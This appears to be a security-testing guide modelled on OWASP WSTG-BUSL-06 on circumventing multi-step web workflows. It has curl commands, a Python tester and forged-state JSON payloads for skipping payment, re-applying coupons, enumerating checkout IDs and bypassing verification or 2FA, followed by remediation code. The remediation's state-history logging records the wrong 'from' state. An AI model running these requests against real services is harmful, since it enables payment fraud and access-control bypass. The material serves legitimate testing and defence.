# WSTG-BUSL-06: Test Circumvention of Work Flows

## Test ID
WSTG-BUSL-06

## Test Name
Testing for the Circumvention of Work Flows

## High-Level Description

Workflow circumvention testing examines whether an application properly enforces the intended sequence of steps in multi-step processes. Many business processes require specific steps to be completed in order (e.g., shopping cart → checkout → payment → confirmation). Attackers may attempt to skip steps, revisit completed steps, or access endpoints out of sequence to bypass security controls, avoid payments, or gain unauthorized access.

---

## What to Check

### Workflow Elements

- [ ] Step sequence enforcement
- [ ] State validation between steps
- [ ] Direct URL/endpoint access
- [ ] Back button/history manipulation
- [ ] Bookmark/link sharing vulnerabilities
- [ ] Parameter manipulation for step skipping

### Common Workflow Vulnerabilities

| Vulnerability | Example |
|---------------|---------|
| Step skipping | Skip payment, go directly to order confirmation |
| Step repetition | Repeat discount application |
| State manipulation | Change order after payment |
| Direct access | Access confirmation page without completing flow |
| Parallel execution | Start multiple flows, complete one |

---

## How to Test

### Step 1: Map the Workflow

```bash
# Document all steps in the workflow
# Example: E-commerce checkout
# 1. Add to cart: POST /api/cart/add
# 2. View cart: GET /api/cart
# 3. Apply coupon: POST /api/cart/coupon
# 4. Checkout: POST /api/checkout/start
# 5. Enter shipping: POST /api/checkout/shipping
# 6. Enter payment: POST /api/checkout/payment
# 7. Confirm order: POST /api/checkout/confirm
# 8. Order complete: GET /api/orders/{id}

# Capture all requests through each step
# Note: URLs, parameters, tokens, session changes
```

### Step 2: Test Direct Step Access

```bash
# Try to access later steps directly without completing earlier ones

# Start fresh session
# Skip to checkout confirmation
curl -s -X POST "https://target.com/api/checkout/confirm" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"order_id": "12345"}'

# Skip to order complete
curl -s "https://target.com/api/orders/12345" \
    -H "Authorization: Bearer $TOKEN"

# Skip payment step
curl -s -X POST "https://target.com/api/checkout/confirm" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "cart_id": "abc123",
        "shipping_id": "ship123"
    }'
    # Note: No payment token
```

### Step 3: Test Step Skipping

```bash
#!/bin/bash
# Test if steps can be skipped

TOKEN="your_auth_token"
BASE="https://target.com"

# Normal flow: 1 -> 2 -> 3 -> 4 -> 5
# Test: 1 -> 3 (skip step 2)

echo "Step 1: Start checkout"
checkout=$(curl -s -X POST "$BASE/api/checkout/start" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"cart_id": "cart123"}')

checkout_id=$(echo $checkout | jq -r '.checkout_id')

echo "Skip step 2, go to step 3..."
# Skip shipping, go directly to payment
result=$(curl -s -X POST "$BASE/api/checkout/payment" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
        \"checkout_id\": \"$checkout_id\",
        \"payment_method\": \"card\",
        \"card_token\": \"tok_test\"
    }")

echo "Result: $result"
# If accepted, workflow can be circumvented
```

### Step 4: Test State Manipulation After Completion

```bash
# Test if completed steps can be modified

# Complete checkout normally
# Then try to modify earlier steps

# Try changing shipping after payment
curl -s -X PUT "https://target.com/api/checkout/abc123/shipping" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "address": "New Address",
        "city": "Attacker City"
    }'

# Try re-applying coupon after order is placed
curl -s -X POST "https://target.com/api/orders/order123/apply-coupon" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code": "DISCOUNT50"}'
```

### Step 5: Test Workflow Token/State Bypass

```bash
# Analyze workflow state tokens
# Look for predictable patterns

# Example: If checkout uses sequential IDs
# Current: checkout_100
# Try: checkout_99, checkout_101

for id in 95 96 97 98 99 100 101 102; do
    response=$(curl -s "https://target.com/api/checkout/checkout_$id/confirm" \
        -H "Authorization: Bearer $TOKEN")
    echo "checkout_$id: $response"
done

# Try with modified state tokens
curl -s -X POST "https://target.com/api/checkout/confirm" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
        "checkout_id": "checkout_99",
        "state_token": "modified_token",
        "step": "complete"
    }'
```

### Step 6: Test Parallel Workflow Execution

```bash
#!/bin/bash
# Test parallel workflow abuse

# Start multiple checkouts
for i in {1..5}; do
    curl -s -X POST "https://target.com/api/checkout/start" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"cart_id": "cart123"}' &
done

wait

# Try to complete them all with single payment
# Or complete one and cancel others after benefits applied
```

### Step 7: Test Registration/Onboarding Bypass

```bash
# Test if onboarding steps can be bypassed

# Try accessing main app without completing onboarding
curl -s "https://target.com/api/dashboard" \
    -H "Authorization: Bearer $NEW_USER_TOKEN"

# Try skipping email verification
curl -s -X POST "https://target.com/api/users/complete-profile" \
    -H "Authorization: Bearer $UNVERIFIED_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name": "Test User"}'

# Try skipping 2FA setup if required
curl -s "https://target.com/api/sensitive-data" \
    -H "Authorization: Bearer $NO_2FA_TOKEN"
```

---

## Tools

### Manual Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Intercept workflow | Modify/replay requests |
| **Postman** | API workflow testing | Collection runners |
| **Browser DevTools** | Monitor state changes | Track tokens/cookies |

### Automated

| Tool | Description |
|------|-------------|
| **Burp Macros** | Automate multi-step flows |
| **Custom scripts** | Workflow fuzzing |

---

## Example Commands/Payloads

### Workflow State Manipulation

```json
// Step indicator manipulation
{"current_step": 5}
{"step": "complete"}
{"workflow_state": "finished"}

// Status manipulation
{"payment_status": "completed"}
{"verified": true}
{"approved": true}

// Skip flags
{"skip_verification": true}
{"express_checkout": true}
{"bypass_review": true}
```

### Workflow Circumvention Tester

```python
#!/usr/bin/env python3
import requests

class WorkflowTester:
    def __init__(self, base_url, token):
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        self.findings = []

    def test_direct_step_access(self, steps):
        """Test if later steps can be accessed directly"""

        for i, step in enumerate(steps):
            if i == 0:
                continue  # Skip first step

            # Try accessing without completing previous steps
            response = requests.request(
                step["method"],
                f"{self.base_url}{step['endpoint']}",
                headers=self.headers,
                json=step.get("payload", {})
            )

            if response.status_code == 200:
                self.findings.append({
                    "type": "direct_access",
                    "step": i + 1,
                    "endpoint": step["endpoint"],
                    "result": "VULNERABLE - Step accessible without prior steps"
                })
            else:
                self.findings.append({
                    "type": "direct_access",
                    "step": i + 1,
                    "endpoint": step["endpoint"],
                    "result": f"Protected - Status {response.status_code}"
                })

    def test_step_skipping(self, steps):
        """Test skipping intermediate steps"""

        # Complete first step
        first = steps[0]
        r1 = requests.request(
            first["method"],
            f"{self.base_url}{first['endpoint']}",
            headers=self.headers,
            json=first.get("payload", {})
        )

        if r1.status_code != 200:
            return

        # Try to skip to later steps
        for i in range(2, len(steps)):
            step = steps[i]
            response = requests.request(
                step["method"],
                f"{self.base_url}{step['endpoint']}",
                headers=self.headers,
                json=step.get("payload", {})
            )

            if response.status_code == 200:
                self.findings.append({
                    "type": "step_skipping",
                    "skipped_to": i + 1,
                    "endpoint": step["endpoint"],
                    "result": f"VULNERABLE - Skipped steps 2-{i}"
                })

    def test_backward_navigation(self, steps, completed_step):
        """Test if earlier steps can be modified after completion"""

        # Assume workflow completed to completed_step
        for i in range(completed_step):
            step = steps[i]

            # Try to modify earlier step
            if step["method"] in ["POST", "PUT"]:
                response = requests.request(
                    step["method"],
                    f"{self.base_url}{step['endpoint']}",
                    headers=self.headers,
                    json=step.get("payload", {})
                )

                if response.status_code == 200:
                    self.findings.append({
                        "type": "backward_modification",
                        "step": i + 1,
                        "endpoint": step["endpoint"],
                        "result": "VULNERABLE - Earlier step modifiable"
                    })

    def generate_report(self):
        """Generate test report"""
        print("\n=== WORKFLOW CIRCUMVENTION REPORT ===\n")

        vulnerabilities = [f for f in self.findings if "VULNERABLE" in f["result"]]

        print(f"Total tests: {len(self.findings)}")
        print(f"Vulnerabilities: {len(vulnerabilities)}")

        if vulnerabilities:
            print("\n--- VULNERABILITIES ---")
            for v in vulnerabilities:
                print(f"  [{v['type']}] {v['endpoint']}: {v['result']}")

        return self.findings

# Usage
tester = WorkflowTester("https://target.com", "auth_token")

checkout_steps = [
    {"method": "POST", "endpoint": "/api/checkout/start", "payload": {"cart_id": "cart123"}},
    {"method": "POST", "endpoint": "/api/checkout/shipping", "payload": {"address_id": "addr1"}},
    {"method": "POST", "endpoint": "/api/checkout/payment", "payload": {"payment_token": "tok1"}},
    {"method": "POST", "endpoint": "/api/checkout/confirm", "payload": {}},
]

tester.test_direct_step_access(checkout_steps)
tester.test_step_skipping(checkout_steps)
tester.generate_report()
```

---

## Remediation Guide

### 1. Implement Workflow State Machine

```python
from enum import Enum
from datetime import datetime

class CheckoutState(Enum):
    INITIATED = "initiated"
    CART_REVIEWED = "cart_reviewed"
    SHIPPING_ADDED = "shipping_added"
    PAYMENT_ADDED = "payment_added"
    CONFIRMED = "confirmed"
    COMPLETED = "completed"

class CheckoutStateMachine:
    VALID_TRANSITIONS = {
        CheckoutState.INITIATED: [CheckoutState.CART_REVIEWED],
        CheckoutState.CART_REVIEWED: [CheckoutState.SHIPPING_ADDED],
        CheckoutState.SHIPPING_ADDED: [CheckoutState.PAYMENT_ADDED],
        CheckoutState.PAYMENT_ADDED: [CheckoutState.CONFIRMED],
        CheckoutState.CONFIRMED: [CheckoutState.COMPLETED],
        CheckoutState.COMPLETED: []
    }

    def can_transition(self, current, target):
        """Check if transition is valid"""
        allowed = self.VALID_TRANSITIONS.get(current, [])
        return target in allowed

    def transition(self, checkout, target_state):
        """Perform state transition with validation"""
        if not self.can_transition(checkout.state, target_state):
            raise WorkflowViolationError(
                f"Cannot transition from {checkout.state} to {target_state}"
            )

        checkout.state = target_state
        checkout.state_history.append({
            "from": checkout.state,
            "to": target_state,
            "timestamp": datetime.utcnow()
        })

        return checkout

# Usage in endpoint
@app.route('/api/checkout/payment', methods=['POST'])
def add_payment():
    checkout = get_checkout(request.json['checkout_id'])

    # Validate state before processing
    if checkout.state != CheckoutState.SHIPPING_ADDED:
        return jsonify({
            "error": "Invalid workflow state",
            "expected": "shipping_added",
            "current": checkout.state.value
        }), 400

    # Process payment
    process_payment(checkout, request.json)

    # Transition state
    state_machine.transition(checkout, CheckoutState.PAYMENT_ADDED)

    return jsonify(checkout.to_dict())
```

### 2. Cryptographic State Tokens

```python
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key"

def generate_workflow_token(checkout_id, current_step, user_id):
    """Generate signed token for workflow state"""
    payload = {
        "checkout_id": checkout_id,
        "step": current_step,
        "user_id": user_id,
        "completed_at": datetime.utcnow().isoformat(),
        "exp": datetime.utcnow() + timedelta(hours=1)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def validate_workflow_token(token, expected_step, checkout_id, user_id):
    """Validate workflow token"""
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

        # Verify all components
        if payload["checkout_id"] != checkout_id:
            return False, "Invalid checkout"

        if payload["user_id"] != user_id:
            return False, "Invalid user"

        if payload["step"] != expected_step - 1:
            return False, f"Invalid step sequence"

        return True, None

    except jwt.ExpiredSignatureError:
        return False, "Token expired"
    except jwt.InvalidTokenError:
        return False, "Invalid token"

@app.route('/api/checkout/payment', methods=['POST'])
def add_payment():
    # Require token from previous step
    prev_token = request.headers.get('X-Workflow-Token')
    if not prev_token:
        return jsonify({"error": "Workflow token required"}), 400

    valid, error = validate_workflow_token(
        prev_token,
        expected_step=3,  # Current step number
        checkout_id=request.json['checkout_id'],
        user_id=current_user.id
    )

    if not valid:
        return jsonify({"error": error}), 400

    # Process and generate new token for next step
    process_payment(request.json)

    new_token = generate_workflow_token(
        request.json['checkout_id'],
        current_step=3,
        user_id=current_user.id
    )

    return jsonify({
        "status": "success",
        "workflow_token": new_token
    })
```

### 3. Server-Side Step Tracking

```python
class WorkflowTracker:
    def __init__(self, redis_client):
        self.redis = redis_client

    def record_step_completion(self, workflow_id, user_id, step):
        """Record completed step"""
        key = f"workflow:{workflow_id}:{user_id}"
        self.redis.sadd(key, step)
        self.redis.expire(key, 3600)  # 1 hour expiry

    def verify_prerequisites(self, workflow_id, user_id, target_step, required_steps):
        """Verify all required steps are completed"""
        key = f"workflow:{workflow_id}:{user_id}"
        completed = self.redis.smembers(key)

        missing = set(required_steps) - completed
        if missing:
            return False, list(missing)

        return True, None

    def lock_completed_steps(self, workflow_id, user_id, step):
        """Lock step to prevent modification"""
        key = f"workflow_lock:{workflow_id}:{user_id}"
        self.redis.sadd(key, step)

    def is_step_locked(self, workflow_id, user_id, step):
        """Check if step is locked"""
        key = f"workflow_lock:{workflow_id}:{user_id}"
        return self.redis.sismember(key, step)
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| Payment step bypass | 9.8 | Critical |
| Verification step bypass | 8.8 | High |
| Discount application after payment | 7.5 | High |
| Onboarding bypass | 6.5 | Medium |
| Step modification after completion | 6.5 | Medium |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-841** | Improper Enforcement of Behavioral Workflow | Workflow bypass |
| **CWE-306** | Missing Authentication for Critical Function | Step skipping |
| **CWE-840** | Business Logic Errors | Logic flaw exploitation |

---

## References

- [OWASP WSTG - Test Circumvention of Work Flows](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Test_Circumvention_of_Work_Flows)
- [OWASP Business Logic Security](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
- [State Machine Security Patterns](https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html)

---

## Checklist

```
[ ] Workflow steps mapped and documented
[ ] Direct step access tested
[ ] Step skipping tested
[ ] State manipulation tested
[ ] Backward navigation tested
[ ] Parallel workflow tested
[ ] Token/state prediction tested
[ ] Registration/onboarding bypass tested
[ ] Payment bypass tested
[ ] State machine enforcement verified
[ ] Findings documented
[ ] Remediation recommendations provided
```
